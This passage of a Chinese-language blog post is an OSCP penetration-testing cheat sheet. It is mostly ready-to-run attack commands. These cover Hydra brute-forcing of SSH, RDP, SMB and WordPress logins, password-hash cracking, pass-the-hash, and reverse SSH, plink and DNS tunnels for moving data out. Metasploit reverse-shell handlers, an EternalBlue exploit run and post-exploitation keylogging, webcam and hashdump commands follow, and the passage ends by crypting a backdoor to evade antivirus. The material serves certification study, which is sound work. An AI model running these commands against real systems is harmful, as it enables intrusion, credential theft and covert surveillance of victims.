+hydra <span class="token variable">$ip</span> -s <span class="token number">22</span> <span class="token function">ssh</span> -l <span class="token operator">&lt;</span>user<span class="token operator">></span> -P big_wordlist.txt
+POP3 爆破
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <span class="token variable">$ip</span> pop3 -V
+SMTP 爆破
+hydra -P /usr/share/wordlistsnmap.lst <span class="token variable">$ip</span> smtp -V
+Hydra 攻击 http 用字典获取 <span class="token number">401</span> 登录
+hydra -L ./webapp.txt -P ./webapp.txt <span class="token variable">$ip</span> http-get /admin
+rdp 爆破
+hydra -t <span class="token number">1</span> -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<span class="token variable">$ip</span>
+SMB 爆破
+hydra -t <span class="token number">1</span> -V -f -l administrator -P /usr/share/wordlists/rockyou.txt <span class="token variable">$ip</span> smb
+Wordpress 管理员爆破
+hydra -l admin -P ./passwordlist.txt <span class="token variable">$ip</span> -V http-form-post <span class="token string">'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="http://openwall.info/wiki/john/sample-hashes">http://openwall.info/wiki/john/sample-hashes</a></p>
+<p>要破解 linux 哈希，您必须首先取消隐藏它们</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unshadow passwd-file.txt shadow-file.txt
+unshadow passwd-file.txt shadow-file.txt <span class="token operator">></span> unshadowed.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>john - 密码哈希破解</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token variable">$ip</span>.pwdump
+john --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hashes
+john --rules --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
+john --rules --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt unshadowed.txt
+wordlist 强制解密破解
+john --format<span class="token operator">=</span>descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
+强制解密蛮力破解
+john --format<span class="token operator">=</span>descrypt <span class="token builtin class-name">hash</span> --show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Windows 中传递哈希 - 使用 Metasploit 来利用实验室中的一台 SMB 服务器。转储密码哈希并尝试对另一个系统进行哈希传递攻击</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">SMBHASH</span><span class="token operator">=</span>aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
+pth-winexe -U administrator //<span class="token variable">$ip</span> cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h2><p>端口转发 - 接受给定 IP 地址和端口上的流量并将其重定向到不同的 IP 地址和端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> rinetd
+<span class="token function">cat</span> /etc/rinetd.conf
+
+<span class="token comment"># bindadress bindport connectaddress connectport</span>
+w.x.y.z <span class="token number">53</span> a.b.c.d <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>SSH本地端口转发：支持双向通信通道</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token operator">&lt;</span>gateway<span class="token operator">></span> -L <span class="token operator">&lt;</span>local port to listen<span class="token operator">></span>:<span class="token operator">&lt;</span>remote host<span class="token operator">></span>:<span class="token operator">&lt;</span>remote port<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>SSH远程端口转发：适用于在内部不可路由的网络上弹出远程 shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token operator">&lt;</span>gateway<span class="token operator">></span> -R <span class="token operator">&lt;</span>remote port to bind<span class="token operator">></span>:<span class="token operator">&lt;</span>local host<span class="token operator">></span>:<span class="token operator">&lt;</span>local port<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>SSH 动态端口转发：在我们的本地攻击机上创建一个 SOCKS4 代理，以将所有传入流量隧道传输到任何端口上的 DMZ 网络中的任何主机</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -D <span class="token operator">&lt;</span>local proxy port<span class="token operator">></span> -p <span class="token operator">&lt;</span>remote port<span class="token operator">></span> <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Proxychains - 从外部计算机在 DMZ 内执行 nmap 扫描</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在 :2222 上从弹出的机器创建反向 SSH 隧道
+<span class="token function">ssh</span> -f -N -T -R2222:localhost:22 yourpublichost.example.com
+<span class="token function">ssh</span> -f -N -R <span class="token number">2222</span>:<span class="token operator">&lt;</span>local host<span class="token operator">></span>:22 root@<span class="token operator">&lt;</span>remote host<span class="token operator">></span>
+
+在 <span class="token number">8080</span> 到 <span class="token number">2222</span> 上创建动态应用程序级端口转发
+<span class="token function">ssh</span> -f -N -D <span class="token operator">&lt;</span>local host<span class="token operator">></span>:8080 -p <span class="token number">2222</span> hax0r@<span class="token operator">&lt;</span>remote host<span class="token operator">></span>
+
+利用 SSH SOCKS 服务器使用代理链在网络上执行 Nmap 扫描
+proxychains nmap --top-ports<span class="token operator">=</span><span class="token number">20</span> -sT -Pn <span class="token variable">$ip</span>/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>HTTP隧道</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -vvn <span class="token variable">$ip</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>流量封装 - 绕过深度数据包检测</p>
+<p>http隧道 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在服务器端
+<span class="token function">sudo</span> hts -F <span class="token operator">&lt;</span>server <span class="token function">ip</span> addr<span class="token operator">></span>:<span class="token operator">&lt;</span>port of your app<span class="token operator">></span> <span class="token number">80</span> 
+在客户端
+<span class="token function">sudo</span> htc -P <span class="token operator">&lt;</span>my proxy.com:proxy port<span class="token operator">></span> -F <span class="token operator">&lt;</span>port of your app<span class="token operator">></span> <span class="token operator">&lt;</span>server <span class="token function">ip</span> addr<span class="token operator">></span>:80 stunnel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从弹出的 Windows 机器隧道远程桌面 (RDP) 到您的网络</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">22</span> 端口上的隧道
+plink -l root -pw pass -R <span class="token number">3389</span>:<span class="token operator">&lt;</span>localhost<span class="token operator">></span>:3389 <span class="token operator">&lt;</span>remote host<span class="token operator">></span>
+
+<span class="token number">22</span>端口被封锁？试试80端口？还是443？
+plink -l root -pw 23847sd98sdf987sf98732 -R <span class="token number">3389</span>:<span class="token operator">&lt;</span>local host<span class="token operator">></span>:3389 <span class="token operator">&lt;</span>remote host<span class="token operator">></span> -P80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用 HTTP 隧道从弹出的 Windows 隧道远程桌面 (RDP)（绕过深度数据包检查）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows 机器在不提示用户的情况下添加所需的防火墙规则
+netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"httptunnel_client"</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">action</span><span class="token operator">=</span>allow <span class="token assign-left variable">program</span><span class="token operator">=</span><span class="token string">"httptunnel_client.exe"</span> <span class="token assign-left variable">enable</span><span class="token operator">=</span>yes
+netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"3000"</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">action</span><span class="token operator">=</span>allow <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3000</span>
+netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"1080"</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">action</span><span class="token operator">=</span>allow <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">1080</span>
+netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"1079"</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">action</span><span class="token operator">=</span>allow <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">1079</span>
+
+启动http隧道客户端
+httptunnel_client.exe
+
+通过连接到 localhost 端口 <span class="token number">3000</span> 创建 HTTP 反向 shell
+plink -l root -pw 23847sd98sdf987sf98732 -R <span class="token number">3389</span>:<span class="token operator">&lt;</span>local host<span class="token operator">></span>:3389 <span class="token operator">&lt;</span>remote host<span class="token operator">></span> -P <span class="token number">3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>VLAN Hopping</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/nccgroup/vlan-hopping.git  
+<span class="token function">chmod</span> <span class="token number">700</span> frogger.sh  
+./frogger.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>VPN Hacking</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">识别 VPN 服务器
+./udp-protocol-scanner.pl -p ike <span class="token variable">$ip</span>
+按文件识别 VPN 服务器
+./udp-protocol-scanner.pl -p ike -f ip.txt
+
+使用 IKEForce 枚举或字典攻击 VPN 服务器
+pip <span class="token function">install</span> pyip
+<span class="token function">git</span> clone https://github.com/SpiderLabs/ikeforce.git
+使用 IKEForce 执行 IKE VPN 枚举
+./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
+使用 IKEForce 蛮力 IKE VPN
+./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s <span class="token number">1</span> 
+
+使用 ike-scan 捕获 PSK 哈希
+ike-scan   
+ike-scan TARGET-IP   
+ike-scan -A TARGET-IP   
+ike-scan -A TARGET-IP --id<span class="token operator">=</span>myid -P TARGET-IP-key   
+ike-scan –M –A –n 示例<span class="token punctuation">\</span>_组-P hash-file.txt 目标IP
+
+使用 psk-crack 破解 PSK 哈希
+psk-crack hash-file.txt   
+pskcrack   
+psk-crack -b <span class="token number">5</span> TARGET-IPkey   
+psk-crack -b <span class="token number">5</span> --charset<span class="token operator">=</span> <span class="token string">" 01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz "</span> <span class="token number">192</span>-168-207-134key   
+psk-crack -d /path/to/dictionary-文件目标 IP 密钥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>PPTP</p>
+<p>识别 PPTP，端口为 1723</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap –Pn -sV -p <span class="token number">1723</span> TARGET<span class="token punctuation">(</span>S<span class="token punctuation">)</span> 
+PPTP字典攻击
+thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>PuTTY Link 隧道 - SSH 隧道</p>
+<p>将远程端口转发到本地地址</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">plink.exe -P <span class="token number">22</span> -l root -pw <span class="token string">"1337"</span> -R <span class="token number">445</span>:<span class="token operator">&lt;</span>local host<span class="token operator">></span>:445 <span class="token operator">&lt;</span>remote host<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>SSH Pivoting</p>
+<p>SSH pivoting from one network to another</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -D <span class="token operator">&lt;</span>local host<span class="token operator">></span>:1010 -p <span class="token number">22</span> user@<span class="token operator">&lt;</span>remote host<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>DNS隧道</p>
+<p>dnscat2 支持“下载”和“上传”命令，用于从目标机器获取文件（数据和程序）</p>
+<p>安装</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update   
+<span class="token function">apt-get</span> -y <span class="token function">install</span> ruby-dev <span class="token function">git</span> <span class="token function">make</span> g++   
+gem <span class="token function">install</span> bundler   
+<span class="token function">git</span> clone https://github.com/iagox86/dnscat2.git   
+<span class="token builtin class-name">cd</span> dnscat2/server   
+bundle <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行 dnscat2</p>
+<pre class="line-numbers language-none"><code class="language-none">ruby .&#x2F;dnscat2.rb  
+dnscat2&gt; New session established: 1422  
+dnscat2&gt; session -i 1422<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell/">https://github.com/lukebaggett/dnscat2-powershell/</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dnscat --host <span class="token operator">&lt;</span>dnscat server ip<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
+<p>使用msf的条件：需要postgresql</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start postgresql
+systemctl <span class="token builtin class-name">enable</span> postgresql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>使用</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">启动 
+msfconsole
+msfconsole -q 不显示炫酷界面启动
+查看帮助
+show -h
+显示auxiliary模块
+show auxiliary
+使用模块
+use auxiliary/scanner/snmp/snmp_enum  
+use auxiliary/scanner/http/webdav_scanner  
+use auxiliary/scanner/smb/smb_version  
+use auxiliary/scanner/ftp/ftp_login  
+use exploit/windows/pop3/seattlelab_pass
+显示模块的基本信息
+info
+显示模块的配置参数
+show options
+设置模块的选项
+<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.1-254  
+<span class="token builtin class-name">set</span> THREADS <span class="token number">10</span>
+运行模块
+run
+执行漏洞利用
+exploit
+搜索模块
+search type:auxiliary login
+
+从 Meterpreter Shell 获取系统信息
+sysinfo
+从 Meterpreter Shell 获取用户 ID
+getuid
+搜索文件
+search -f *pass*.txt
+上传一个文件
+upload /usr/share/windows-binaries/nc.exe c:<span class="token punctuation">\</span><span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token punctuation">\</span>Offsec
+下载文件
+download c:<span class="token punctuation">\</span><span class="token punctuation">\</span>Windows<span class="token punctuation">\</span><span class="token punctuation">\</span>system32<span class="token punctuation">\</span><span class="token punctuation">\</span>calc.exe /tmp/calc.exe
+从 Meterpreter Shell 调用命令 shell
+shell
+退出meterpreter shell
+<span class="token builtin class-name">exit</span>
+
+后台会话
+background
+
+multi/handler 接受传入的 reverse_https_meterpreter
+use exploit/multi/handler  
+<span class="token builtin class-name">set</span> PAYLOAD windows/meterpreter/reverse_https  
+<span class="token builtin class-name">set</span> LHOST <span class="token variable">$ip</span>  
+<span class="token builtin class-name">set</span> LPORT <span class="token number">443</span>  
+exploit  
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started HTTPS reverse handler on https://<span class="token variable">$ip</span>:443/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Metasploit 数据库访问</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">显示在 MSF 数据库中发现的所有主机
+hosts
+扫描主机并将它们存储在 MSF 数据库中
+db_nmap
+在 MSF 数据库中搜索特定端口的机器
+services -p <span class="token number">443</span>
+利用 MSF 数据库扫描 SMB 端口（自动完成的 rhosts）
+services -p <span class="token number">443</span> --rhosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Staged and Non-staged</p>
+<ul>
+<li>Non-staged payload - 是一次性完整发送的有效负载</li>
+<li>Staged payload - 分两部分发送 没有足够的缓冲空间或需要绕过杀毒</li>
+</ul>
+<p>MS17-010 - 永恒之蓝</p>
+<p>内置的 Metasploit EternalBlue 模块可能攻击失败</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">配置 Kali 以使用 wine 32bit
+dpkg --add-architecture i386 <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> wine32 
+<span class="token function">rm</span> -r ~/.wine 
+wine cmd.exe 
+<span class="token builtin class-name">exit</span>
+
+<span class="token function">git</span> clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+
+将漏洞利用移动到 /usr/share/metasploit-framework/modules/exploits/windows/smb 或 ~/.msf4/modules/exploits/windows/smb
+
+启动msf即可
+<span class="token operator">></span>use exploit/windows/smb/Eternalblue-Doublepulsar
+exploit<span class="token punctuation">(</span>eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">10.10</span>.10.10
+RHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.10.10 
+exploit<span class="token punctuation">(</span>eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> PROCESSINJECT spoolsv.exe 
+PROCESSINJECT <span class="token operator">=</span><span class="token operator">></span> spoolsv.exe 
+exploit<span class="token punctuation">(</span>eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>自己构建msf模块</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p ~/.msf4/modules/exploits/linux/misc  
+<span class="token builtin class-name">cd</span> ~/.msf4/modules/exploits/linux/misc  
+<span class="token function">cp</span> /usr/share/metasploitframework/modules/exploits/linux/misc/gld<span class="token punctuation">\</span>_postfix.rb ./crossfire.rb  
+<span class="token function">vi</span> crossfire.rb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>后渗透</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">download 下载文件或目录
+upload 上传文件或目录
+portfwd 将本地端口转发到远程服务
+route 查看和修改路由表
+keyscan_start 开始捕获击键
+keyscan_stop 停止捕获击键
+screenshot 抓取交互式桌面的屏幕截图
+record_mic 从默认麦克风录制音频 X 秒
+webcam_snap 从以下位置拍摄快照指定的网络摄像头
+getsystem 尝试将您的权限提升到本地系统的权限。
+hashdump 转储 SAM 数据库的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>使用软件保护程序加密已知恶意软件</p>
+<p>开源加密器 Hyperion</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/windows-binaries/Hyperion-1.0.zip  
+<span class="token function">unzip</span> Hyperion-1.0.zip  
+<span class="token builtin class-name">cd</span> Hyperion-1.0/  
+i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
+<span class="token function">cp</span> -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll <span class="token builtin class-name">.</span>  
+<span class="token function">cp</span> -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll <span class="token builtin class-name">.</span>  
+wine hyperion.exe <span class="token punctuation">..</span>/backdoor.exe <span class="token punctuation">..</span>/crypted.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">ezy</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://ezy0812.github.io/2022/10/30/OSCP%E5%B8%B8%E7%94%A8cheatsheet/">https://ezy0812.github.io/2022/10/30/OSCP%E5%B8%B8%E7%94%A8cheatsheet/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">ezy</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">笔记</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/10/30/OSCP%E5%B8%B8%E7%94%A8cheatsheet/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="OSCP常用cheatsheet">
+                        
+                        <span class="card-title">OSCP常用cheatsheet</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x05/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="内网笔记0x05">
+                        
+                        <span class="card-title">内网笔记0x05</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块全屏 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
